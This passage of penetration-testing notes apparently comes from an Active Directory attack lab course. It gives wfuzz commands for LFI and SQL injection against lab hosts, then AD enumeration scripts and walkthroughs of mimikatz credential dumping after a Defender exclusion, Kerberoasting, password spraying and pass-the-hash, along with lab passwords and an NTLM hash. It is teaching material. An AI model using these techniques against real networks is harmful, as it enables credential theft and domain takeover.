/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z</a> | grep -v 851 | grep -v 835 &gt; LFIList.txt<br /><a href="http://192.168.11.130/thankyou.php?file=/etc/passwd">http://192.168.11.130/thankyou.php?file=/etc/passwd</a>  &lt;&lt;&lt; paramater name file was found as well as pathtohost /etc/passwd<br />^^used to brute force a get request to a webpage<br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all-extensionless.txt -u <a href="http://192.168.11.130/thankyou.php?file=FUZZ">http://192.168.11.130/thankyou.php?file=FUZZ</a> | grep -v 835                     &lt;&lt;&lt;use against url<br />wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d &quot;myusername=john&amp;mypassword=FUZZ&amp;Submit=Login&quot;  <a href="http://192.168.11.8/checklogin.php">http://192.168.11.8/checklogin.php</a>             &lt;&lt;&lt;use against page input</div><div class='page'><h1 class='title level-2'>zipping</h1><br/></div><div class='page'><h1 class='title level-3'>tar</h1><br/>tar -xvf filename       &lt;&lt;unzip<br /><br />tar -cvzf outfile.tar.gz filename      &lt;&lt;zip as tar.gz<br />tar -cvf    outfile.tar filename     &lt;&lt;zip as tar<br /><br />l</div><div class='page'><h1 class='title level-3'>gz</h1><br/>gunzip example.gz</div><div class='page'><h1 class='title level-3'>7z</h1><br/><em><span style="color:#666666;"># Install the full version 7zip.</span></em><em><br /></em><em><strong><span style="color:#c20cb9;">sudo</span></strong></em><em><strong> </strong></em><em><strong><span style="color:#c20cb9;">apt-get install</span></strong></em><em><strong> p7zip-full<br /> <br /></strong></em><em><strong><span style="color:#666666;"># Unzip your file.</span></strong></em><em><strong><br />7z  x  your-file.zip<br /> <br /></strong></em><em><strong><span style="color:#666666;"># Or unzip your password protected file.</span></strong></em><em><strong><br />7z  x  </strong></em><em><strong><span style="color:#660033;">-pPASSWORD</span></strong></em><em><strong>  your-file.zip</strong></em></div><div class='page'><h1 class='title level-1'>Other</h1><br/></div><div class='page'><h1 class='title level-2'>AD Demystification</h1><br/></div><div class='page'><h1 class='title level-3'>Introduction</h1><br/></div><div class='page'><h1 class='title level-4'>Course Goals</h1><br/>Improve understanding of how domained Windows environments function and the common ways that it is abused.</div><div class='page'><h1 class='title level-4'>Environment and Setup</h1><br/>-Windows machines plus a kali.<br />    -Windows Server 2016 DC<br />    -Windows Server 2016 IIS<br />    -Windows 10<br />    -Windows 7<br />    -Kali<br /><br />Be sure that all machines are on the same network, pingable and that the windows machines are on the domain.<br /><br />Windows defender, firewall, and real time protection are on and updated as of 7/1/2020.<br />IIS server is running as a service account as opposed to an MSA.<br /><br />Creds-<br />Yee\Administrator (local admin DC):12qwaszx!@QWASZX<br />IIS (local admin IIS):12qwaszx!@QWASZX<br />yee\squid (domain user):yeetcannon<br />yee\tire (domain admin):adminyeetcannon<br />squid (kali):toortoor</div><div class='page'><h1 class='title level-4'>Nomenclature</h1><br/>LDAP - Used to access information in directory services (more specifically active directory in this scenario) over a network.<br /><br />LDAP name structure:<br />    LDAP://DC01.yee.wtf/DC=yee,DC=wtf<br />    hostname = &quot;DC01&quot;<br />    Domain Component (DC) = “yee.wtf”<br />    Distinguished Name = DC=&quot;yee,DC=wtf&quot;<br /><br /><a href=""><img src="images/1146-1.png" alt="images/1146-1.png" /></a><br /><br />object = Thing. Example:&quot;A user named Patrick&quot; of “A group named ‘Server Admins’”<br />objectclass = The charachteristics assigned to a type of object. Example:&quot;A user object type needs to have a ‘Display Name’ and can also have an address&quot;<br />objectclass attribute = The value of the charachteristics assigned to an object. Example:&quot;The objectclass attribute of ‘Display Name’ for Patrick is ‘P.Rothfus’&quot;<br /><br />UPN - User Principal Name - Used to Identify a user account. Example: “JGrisham@yee.wtf”<br /><br />SPN - Service Principle Name - Used to identify a service account (Like a UPN, but for a service and it associates a user account) - A mechanism used to provide specifc access to a an instance of a service on a machine. When a session ticket is presented to a SQL server the SPN needs to match that of the principal name of the SQL service. This exists to limit access to just the sql service as opposed to the entire SQL server. Example: “http/iis.yee.wtf tripp” http=service iis.yee.wtf=servername tripp=assosiated user<br /><br />MSA - Managed Service Account - An account with a long complex password, programatically changed periodically. MSA&#39;s are choice for accounts used to own/run SPN services. <br /><br />Lsass - Process that localy stores cached Windows creds.<br /><br />WDigest - Protocol used for clients to send cleartext credentials to HTTP and Simple Authentication Security Layer applications. Windows stores the password in memory for convenience of the user when they login to their workstation.<br /><br />Nonce - In cryptography, a nonce is an arbitrary number that can be used just once in a cryptographic communication. (Used in NTLM authentication)<br /><br />COM - Component Object Model - COM is an old Windows standard that enables interaction between programs. An example of a COM object would be a Word document with an Excel docement inside it that changes with the original Excel document. The more modern version of COM is .NET framework.<br /><br />DCOM - Distributed Component Object Model -  Unlike COM, DCOM is actually a protocol. DCOM is a subprotocol for MSRPC (port 135, Microsoft enhanced Remote Procedure Call) and is used to bridge the connection between software components and network components. Outlook over HTTP utilizes DCOM.<br /><br />Token - Each process on a windows machine has a token. The token describes the privileges of that process.<br /><br />Mandatory Integrity Control - A Process&#39;s Context Integrity - Defined as System, High, Medium, and Low. A process&#39;s context integrity defines its “trustworthyness,” which in turn determines what that process will have access to. For example IE by default will run in either a medium or high integrity context depending on how it is kicked off, but each tab will run in a low integrity process due to its low “trustworthyness.”<br /><br />What is the diﬀerence between a user account and a service account? - Nothing. Just how it is implemented.<br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Authentication Protocols</h1><br/></div><div class='page'><h1 class='title level-4'>NTLM</h1><br/></div><div class='page'><h1 class='title level-5'>When NTLM is used</h1><br/>1. NTLM authentication is used when a client authenticates to a server via IP address (instead of by hostname).<br />2. If the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server. <br />3. Third-party applications may choose to use NTLM authentication instead of Kerberos authentication. </div><div class='page'><h1 class='title level-5'>NTLM Function</h1><br/><a href=""><img src="images/1163-1.png" alt="images/1163-1.png" /></a><br /><br />1. From the users password the client caculates the NTLM hash. <br />2. The client sends its username to the application server it wants to authenticate to.<br />3. The application server sends a nonce to the client (Challenge).<br />4. The client sends back the nonce encrypted with its NTLM hash (Responce).<br />5. The application server sends the “Responce,” recieved from the client, username, and nonce to the Domain controler.<br />6. The domain controller, already having the NTLM hash for each username, encryptes the nonce with the NTLM hash of the assosiated username and compares that with the one recieved from the application server.<br />7. If the encrypted nonce&#39;s match, a message to approve authentication will be sent to the application server.</div><div class='page'><h1 class='title level-4'>Kerberos</h1><br/></div><div class='page'><h1 class='title level-5'>When is Kerberos used</h1><br/>Standard since Windows Server 2003.</div><div class='page'><h1 class='title level-5'>Kerberos Fucntion</h1><br/><a href=""><img src="images/1167-1.png" alt="images/1167-1.png" /></a><br /><br />Part 1. Login<br />1. A request is sent from client to the domian controller. <br />   a) The domain controller must have the role of key distribution center and authentication server service. <br />   b) This transaction is refred to as the Authentication Server Request (AS_REQ).<br />   c) The AS_REQ contains a time stamp that is encrypted using a hash derived from the password and username of the user.<br />2A. The domain contorler attempts to decrypt the time stamp with the user name and password in its database.<br />   a) If the time stamp is a duplicate, authentication will be unsucsessful (this is to mitigate replay attacks).<br />2B. The controller sends the sends the client an Authentication Server Reply (AS_REP).<br />    a) The AS_REP containsa a “Session Key” and a “Ticket Granting Ticket” (TGT).<br />    b) The session key is encrypted using the user&#39;s password hash and can be decrypted by the client and reused.<br />    c) The TGT contains information about the client.<br />        1. Group membership.<br />        2. Domain name.<br />        3. Time stamp.<br />        4. Client IP address.<br />        5. Session key.<br />    d) The TGT is encrypted by a secret only known to the KDC and cannot be decrypted by the client.<br />Part 2. Access resources in the domain<br />3. The client creates and sends a “Ticket Granting Service Request” (TGS_REQ) to the KDC (key distribution center/domain controller).<br />    a) The TGS_REQ contains, current user.<br />    b) Time stamp (encrypted using the session key).<br />    c) SPN of the resource.<br />    d) Encrypted TGT.<br />4a. The KDC recieves the TGS_REQ.<br />    a) The KDC checks if the SPN exists.<br />    b) The TGT is decrypted (using the secret key only known to the KDC).<br />    c) The session key is extracted from the TGT and is used to decrypt the username and timestamp of the request.<br />    d) The KDC performs several checks.<br />        1. The TGT timestamp must be valid.<br />        2. The username from the TGS_REQ must match the username from the TGT.<br />        3. The client IP address must match the TGT IP address<br />4b. If all checks are passed the Ticket Granting Service of the KDC responds to the client with a Ticket Granting Server Reply (TGS_REP).<br />    a) The TGS_REP contains the SPN granted access to.<br />    b) The Session Key to be used between the client and the SPN.<br />    c) A Servcie Ticket containing.<br />        1. The username.<br />        2. Group Memberships.<br />        3. The newly created session key.<br />        Note- The whole Service Ticket is encrypted with the password hash of the service account registered with the SPN to be authenticated to. The SPN and new Session key inside of the Service Ticket are encrypted with the session key of the clients TGT. <br />        The client now has a session key and a service ticket.<br />5. The client sends the application server an Application Request (AP_REQ).<br />    a) The AP_REQ includes.<br />    b) The username and timestamp encrypted with the Session Key for the Service Ticket.<br />    c) The Session Key.<br />    d) The Service Ticket.<br />6a. The application server recieves the AP_REQ.<br />    a) The Service Ticket is decrypted using the service accounts&#39; password hash extracting the username and Session key.<br />    b) That Session Key is then used to decrypt the username from the AP_REQ.<br />    c) If the AP_REQ username matches the one decrypted from the Service Ticket the request is accepted.<br />    d) The service inspects the group memberships in the Service Ticket.<br />    e) If the proper permissions are held, then access will be granted to the service.<br />    <br />    <br /></div><div class='page'><h1 class='title level-5'>Kerberos Funciton Summarized</h1><br/>Part 1- Login<br />1. Client Sends KDC a AS_REQ that has the time stamp encrypted with the users hash.<br />2. If the AS_REQ passes the checks, an AS_RES is sent to the client containing a Session Key and a TGT.<br />Part 2- Resource Access<br />3. The client sends a TGS_REQ to the KDC containing the desired SPN and the clients encrypted TGT.<br />4. If the TGS_REQ passes the checks, a TGS_REP is sent to the client containing a session key for that new session, a Service Ticket, and the desired SPN.<br />5. The client sends the application server an AP_REQ containing the username/timestamp encrypted with the Session Key, the Session Key, and the Service Ticket.<br />6. If the AP_REQ passes the checks, the client is permitted access to the service.</div><div class='page'><h1 class='title level-3'>LDAP Enumeration</h1><br/>This will be run on bossman from the user context of squid@yee</div><div class='page'><h1 class='title level-4'>Net.exe</h1><br/>net user<br />net user /domain<br /><a href=""><img src="images/1152-1.png" alt="images/1152-1.png" /></a><br />net user Tripp /domain<br /><a href=""><img src="images/1152-2.png" alt="images/1152-2.png" /></a><br />net group /domain<br /><a href=""><img src="images/1152-3.png" alt="images/1152-3.png" /></a><br />Note, that it appears as if there are nested groups we won&#39;t be able to tell due to net.exe&#39;s limitations.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. Find and annotate who is in the domain users group.<br />2. Find and annotate who is in the domain admins group.<br /></div><div class='page'><h1 class='title level-4'>Powershell</h1><br/>These will all be run from Bossman (windows 10) from the context of the user squid.<br /><a href=""><img src="images/1153-1.png" alt="images/1153-1.png" /></a><br />Basic outline<br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(objectClass=Group)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;$obj}</div></div><br />find all users<br /><a href=""><img src="images/1153-2.png" alt="images/1153-2.png" /></a><br />find all users with cleaner output<br /><a href=""><img src="images/1153-3.png" alt="images/1153-3.png" /></a><br />find all groups<br /><a href=""><img src="images/1153-4.png" alt="images/1153-4.png" /></a><br />find nested groups<br /><a href=""><img src="images/1153-5.png" alt="images/1153-5.png" /></a><br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(objectClass=Group)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.properties.memberof&nbsp;-like&nbsp;$start_group){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host&nbsp;$obj.properties.name&nbsp;&#39;is&nbsp;a&nbsp;member&nbsp;of&#39;&nbsp;$start_group}}<br />&nbsp;&nbsp;&nbsp;<br /></div></div><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. Find What group is at the bottom of the nesting from the starting group marforcyber, and who the sole member is of that group.<br />2. Attempt to find who Kvothe&#39;s manager is.<br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>PowerView</h1><br/>Grants access to API&#39;s that are not easily utilized.<br />NetWkstaUserEnum- Can be leveraged to map out the domain as well as logged in users. Need Administrative coverage of each machine to return results (domain admin).<br />NetSessionEnum- Can be used to identify DC&#39;s and Share servers. Can be run from user context.<br /><br />Powerview has tons of capabilities.<br />Get-NetLoggedon takes advantage of the NetWkstaUserEnum API.<br />These were run from bossman under the context of a domain user and then a domain admin.<br /><a href=""><img src="images/1154-1.png" alt="images/1154-1.png" /></a><br /><a href=""><img src="images/1154-2.png" alt="images/1154-2.png" /></a><br /><br />Get-NetSession takes advantage of the NetSessionEnum API.<br /><a href=""><img src="images/1154-3.png" alt="images/1154-3.png" /></a><br /><a href=""><img src="images/1154-4.png" alt="images/1154-4.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. When running Get-Netsession under the context of squid, why can you not see that tire is logged in?</div><div class='page'><h1 class='title level-4'>Service Principal Names</h1><br/><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;serviceprincipalname=*http*&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){$obj}</div></div><br /><a href=""><img src="images/1155-1.png" alt="images/1155-1.png" /></a></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. Useing the homemade enumeration script, determine what other SPN&#39;s are in the environment.</div><div class='page'><h1 class='title level-3'>Cached Credentials Storage/Retrieval</h1><br/>User credentials are primarlily stored in Local Security Authority Subsystem Service (LSASS) memory space which runs as SYSTEM. <br />LSASS data structures are not publicly documented.<br />Mimikatz is the defacto standard for LSASS manipulation and can be implemented to bypass detection many ways.</div><div class='page'><h1 class='title level-4'>Logon Passwords</h1><br/>As well as this being an example of the default use of mimikatz, it is also an example of mimikatz bypassing windows defender, smart screen, and real time protection.<br /><br /><a href="https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/">https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/</a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1172-1.png" alt="images/1172-1.png" /></a><br />Crackstation.net shows that the NTLM hash of JBettis is “TheBus.”<br /><a href=""><img src="images/1172-2.png" alt="images/1172-2.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Tickets</h1><br/>In the realm of Kerberos authentication tickets come in the form of Ticket Granting Tickets (TGT) and Ticket Granting Service Tickets (TGS). <br />Remember! When a user completes a login (AS_REQ and then AS_REP) the AS_REP contains a TGT for that user. The user will then use that TGT to make a TGS request (TGS_REQ) when trying to authenticate with an application server.<br /><br />In summary, if you are able to steal a TGS of another user you can authenticate to only the specified service as them. With a TGT you can legitamitly go through the TGS_REQ, TGS_REP, AP_REQ, and AP_REP process and authenticate to any application service that the original TGT had access to. </div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br />In this example Add-MpPreference was used to exclude the &quot;C:\tools&quot; directory form Real Time Proteciton. Mimikatz was then downloaded from the kali webserver and ran.<br />Privilege::debug was used to run the commands under the context of the security privilige SEDebugPrivilige. This needs to be done becasue LSASS is running under the context of SYSTEM.<br /><a href=""><img src="images/1171-1.png" alt="images/1171-1.png" /></a><br />Note- The account you made a ticket for, must be authorized to reach a service that can be remotley administred otherwise it is not very useful. A microsoft SQL server would be the most obvious way to aquire RCE from here.</div><div class='page'><h1 class='title level-4'>WDigest</h1><br/>WDigest - Protocol used for clients to send cleartext credentials to HTTP and Simple Authentication Security Layer applications. Windows stores the password in memory (LSASS) for convenience of the user when they login to their workstation.<br />Optional Patch released in 2014. 2008R2/7 and before is vulnerable unless the optional patch and registry change was applied. <br /><br /><a href="https://www.hackingarticles.in/credential-dumping-wdigest/">https://www.hackingarticles.in/credential-dumping-wdigest/</a></div><div class='page'><h1 class='title level-5'>Demonstatation</h1><br/>This was run from Userbox (Windows 7) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1160-1.png" alt="images/1160-1.png" /></a><br /><br />This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1160-2.png" alt="images/1160-2.png" /></a><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Kerberoast</h1><br/>What is Kerberoasting?<br />When a TGS_REQ is requested a TGS_RES is returned without authentication (The authentication (group access) is to be done by the application after the AP_REQ). The TGS_RES sent to the requesting computer is encoded with the hash of the password of the SPN owner. Brute forcing the TGS_RES can be done quickly and silently (done offline) leaving someone with the password for the SPN that shold not have it. Keep in mind that they will still need to be able to determine who the password belongs to and the SPN owner may not be obvious. <br /><br /><a href="https://www.blackhillsinfosec.com/a-toast-to-kerberoast/">https://www.blackhillsinfosec.com/a-toast-to-kerberoast/</a><br /></div><div class='page'><h1 class='title level-4'>Demonstration 1</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br /><a href=""><img src="images/1151-1.png" alt="images/1151-1.png" /></a><br />Notice that the user is just a domain user and this is all being run from a non-elevated context.<br /><a href=""><img src="images/1151-2.png" alt="images/1151-2.png" /></a><br />After AS_REP it is expected that we would have a TGT. We see here that we also completed a AP_REP and were granted the ability to access the LDAP/DC01.yee.wtf/yee.wtf SPN (this is standard).<br /><a href=""><img src="images/1151-3.png" alt="images/1151-3.png" /></a><br />These commands are simply adding a non-default namespace and then requesting a ticket for the http/IIS.yee.wtf SPN. The key point here is that you do not need to be able to authenticate with the IIS server to do this. If you send the KDC a TGS_REQ for the ‘HTTP/IIS.yee.wtf’ SPN you will recieve a TGS_REP with a Service Ticket for the desired SPN. This Service Ticket is encrypted with the password for the SPN. If you can brute force it, you&#39;ve got the password.<br /><a href=""><img src="images/1151-4.png" alt="images/1151-4.png" /></a><br />We can see that we now have a Session Ticket for the HTTP SPN.<br /><a href=""><img src="images/1151-5.png" alt="images/1151-5.png" /></a><br />Dump the Tickets to disk.<br /><a href=""><img src="images/1151-6.png" alt="images/1151-6.png" /></a><br />Move the HTTP ticket to the kali box.<br />From here all we need to is crack the hash and BOOM, we&#39;ve got a password! This brute forcing is very fast.<br /><a href=""><img src="images/1151-7.png" alt="images/1151-7.png" /></a><br />Lastly we use our HomeMadeADEnum.ps1 script to see who the owner of the SPN is.<br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;serviceprincipalname=*&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()<br />foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.Properties.serviceprincipalname&nbsp;-like&nbsp;&#39;*http/iis*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($value&nbsp;in&nbsp;$obj.Properties){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value}}}<br /><br /><br /><br /></div></div><br /><a href=""><img src="images/1151-8.png" alt="images/1151-8.png" /></a><br />Now we know the owner of the HTTP SPN is Tripp, his password is &quot;Passw0rd,&quot; and he is a member of the IIS_IUSRS group.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Demonstration 2</h1><br/>Both of these enumerations were run from the kali machine against the whole domain. The first with zero authentication, the Second with the creds of a domain user.<br /><a href=""><img src="images/1202-1.png" alt="images/1202-1.png" /></a><br /><br /><a href=""><img src="images/1202-2.png" alt="images/1202-2.png" /></a><br />I then copy-pasted the ticket into krb5tgs.out and ran it against john, giving us the password Passw0rd.<br /><a href=""><img src="images/1202-3.png" alt="images/1202-3.png" /></a><br /></div><div class='page'><h1 class='title level-3'>Brute Force</h1><br/>There are about 65535 different tools to brute force things in active directory. The better ones will run some queries to determine what the account lockout numer is and how long you have until you can try again without locking the account.</div><div class='page'><h1 class='title level-4'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br /><a href=""><img src="images/1174-1.png" alt="images/1174-1.png" /></a><br />Determined how fast we could spray with net accounts, and checked our known password against all accounts.<br />This could also be done with our HomeMadeEnum.ps1 script.</div><div class='page'><h1 class='title level-3'>Lateral Movment</h1><br/></div><div class='page'><h1 class='title level-4'>Pass the Hash</h1><br/>Pass the hash allows us to authenticate with the users via their NTLM hash. <br />This is method uses NTLM LEGITIMATLY. <br />Generally when passing the hash, in order to get a reverse shell the hash must belong to a domain admin or local admin because the account needs to be able to access the $Admin share.<br />For Pass the Hash to work, Windows File and Print Sharing needs to be enabled. <br />Pass the Hash uses the Service Control Manager API.</div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1176-1.png" alt="images/1176-1.png" /></a><br /><a href=""><img src="images/1176-2.png" alt="images/1176-2.png" /></a></div><div class='page'><h1 class='title level-4'>Overpass the Hash</h1><br/>Overpass the Hash is similar to Pass the Hash as they both utilize a compromised NTLM hash, but in Overpass the Hash we will take that compromised NTLM hash and turn it into a TGT (or TGS). If our created TGT is that of a domain admin, it will give us the ability to send a TGS_REQ to the KDC that will return a TGS_RES containing a TGS that will allow us to authenticate to servers as that user. </div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in an elevated command prompt.<br />We have dumped Tire&#39;s hash several times now, but in case you don&#39;t have it : 4A75E2A7EE6E92ACBC02692028A4EECF<br />Utilizing overpass the hash (pth in mimikatz), create a session running as squid but will allow us to run commands as Tire.<br />First I am going to show that I am a user with the 3 standard tickets, plus one more becasue this is run in a users elevated command prompt. Note that I am denied when I try to psexec to the DC.<br /><a href=""><img src="images/1177-1.png" alt="images/1177-1.png" /></a><br /><a href=""><img src="images/1177-2.png" alt="images/1177-2.png" /></a><br /><br />I then used mimikatz to create a TGT with the NTLM hash of Tire and then kick off a cmd prompt.<br /><a href=""><img src="images/1177-3.png" alt="images/1177-3.png" /></a><br />In the new command prompt I showed that all of the previously cached tickets were gone (mimikatz-ism). What is really important about this is that just becasue we “successfully” created a TGT does not mean It will get me a TGS that will successfully authenticate to anything.<br />I then psexeced to the DC (which I was not able to do before).<br />After proving that I was on the DC I exited back to Bossman and checked my klist, noteing that there are cached tickets there now.<br /><a href=""><img src="images/1177-4.png" alt="images/1177-4.png" /></a><br /><a href=""><img src="images/1177-5.png" alt="images/1177-5.png" /></a><br />The NTLM hash was what we started with, and we ended with the TGT for a domain admin.<br /><br />Note- There was some minor hand of god that needed to be added to squids account to make this work. Not 100% as to why it was needed.<br /><a href=""><img src="images/1177-6.png" alt="images/1177-6.png" /></a></div><div class='page'><h1 class='title level-4'>Pass the Ticket</h1><br/>Pass the ticket is very similar to an Overpass the Hash technique, but instead of creating a TGT we are going to create a TGS.<br />Pass the ticket works because once a TGS is created and encrypted with the password “theoretically” only known to the KDC and itself it is trusted.<br /><br /><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Silver_Ticket_Walkthrough.html">https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Silver_Ticket_Walkthrough.html</a><br /></div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br /><a href=""><img src="images/1178-1.png" alt="images/1178-1.png" /></a><br /><a href=""><img src="images/1178-2.png" 